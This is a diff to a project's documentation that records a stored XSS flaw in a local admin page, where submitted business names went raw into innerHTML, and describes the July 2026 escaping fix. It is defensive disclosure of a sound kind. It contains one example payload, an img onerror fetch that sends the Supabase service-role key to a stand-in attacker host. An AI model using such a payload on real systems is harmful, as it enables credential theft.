@@ -82,6 +82,10 @@ The_Peoples_Ledger/
 
 **admin.html is gitignored** — runs locally only, holds the admin password and the service-role key, never deployed.
 
+**Gitignoring it is necessary but not sufficient.** It stops the service-role key leaking *through the repo*; it does nothing to stop script *executing inside the page*, and "runs locally" is no protection — the browser rendering admin.html has the key in scope and full network access to Supabase. Until July 2026, `s.business_name` was interpolated raw into `innerHTML` in the submission list (`renderList`) and the detail panel (`selectSubmission`), while every other field already went through `escapeHtml()` via `field()`. Business names come from anonymous submitters through index.html, and the pending list renders on dashboard load — **before** any approve/reject decision — so a business named `<img src=x onerror="fetch('https://evil.tld/?k='+SUPABASE_ADMIN_KEY)">` would exfiltrate the service-role key just from opening the queue. Manual moderation cannot mitigate this: reviewing a submission requires rendering it.
+
+**Fix (July 2026):** both `business_name` sites and the `status` badge (which lands in a `class` attribute) now go through `escapeHtml()`, and `escapeHtml()` was extended to escape `'` and to handle `null`/`undefined`. **Rule going forward: any new `${...}` inside an `innerHTML` template string in admin.html must be wrapped in `escapeHtml()` unless it is a DB-generated integer ID.** Candidate Voice's admin panel had the same defect, more extensively, and was fixed in the same pass.
+
 **The entire `data/` folder is gitignored.** The live site reads from Supabase, so no working file belongs in the repo. Scripts derive `data/` from their own location, so there are no hardcoded absolute paths anywhere in committed code.
 
 ---
